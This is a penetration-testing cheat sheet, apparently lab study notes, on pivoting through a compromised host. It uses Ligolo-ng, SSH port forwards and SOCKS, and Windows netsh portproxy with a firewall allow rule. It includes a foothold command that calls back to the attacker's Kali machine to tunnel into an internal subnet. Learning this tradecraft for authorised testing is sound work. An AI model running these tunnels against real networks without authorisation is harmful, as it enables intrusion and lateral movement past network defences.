# Tunneling

## Ligolo-ng workflow
```text
1. Start proxy on Kali.
2. In the Ligolo console, create the tun interface.
3. Run the agent on the foothold.
4. In the Ligolo console, select the session and start the tunnel.
5. In the Ligolo console, check the foothold subnet.
6. Add the route from the Ligolo console.
7. Scan from Kali with `-sT` / `--unprivileged`.
```

# Kali

## Start proxy
```bash
./proxy -selfcert
```

# Ligolo Console

## Create the tun interface
```text
interface_create --name ligolo
```

## Show the TLS fingerprint
```text
certificate_fingerprint
```

# Foothold

## Start the agent
```cmd
agent.exe -connect <KALI-IP>:11601 -accept-fingerprint <FINGERPRINT>
```

# Lab fallback only
```cmd
agent.exe -connect <KALI-IP>:11601 -ignore-cert
```

# Ligolo Console

## Select the session
```text
session
session <id>
```

## Start the tunnel
```text
tunnel_start --tun ligolo
ifconfig
```

## Add the route
```text
interface_add_route --name ligolo --route <subnet from ifconfig>
```

# Kali

## Scan through the tunnel
```bash
nmap -sn <subnet from ifconfig>
nmap -Pn -n --unprivileged -sT 172.16.5.10
```

## Local port forward with SSH
```bash
ssh -L 8080:172.16.5.10:80 user@<foothold>
```

## Expose a localhost-only Windows service with portproxy
```cmd
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=127.0.0.1 connectport=8080
netsh advfirewall firewall add rule name="portproxy_8080" dir=in action=allow protocol=TCP localport=8080
```

## Show and delete portproxy rules
```cmd
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=8080
netsh advfirewall firewall delete rule name="portproxy_8080"
```

## Dynamic SOCKS proxy with SSH
```bash
ssh -D 9050 user@<foothold>
```

## Remote port forward with SSH
```bash
ssh -R 8080:127.0.0.1:80 user@<foothold>
```

## Rule
```text
If a useful service binds to 127.0.0.1 and you already have shell access, expose it immediately before chasing other paths.
```
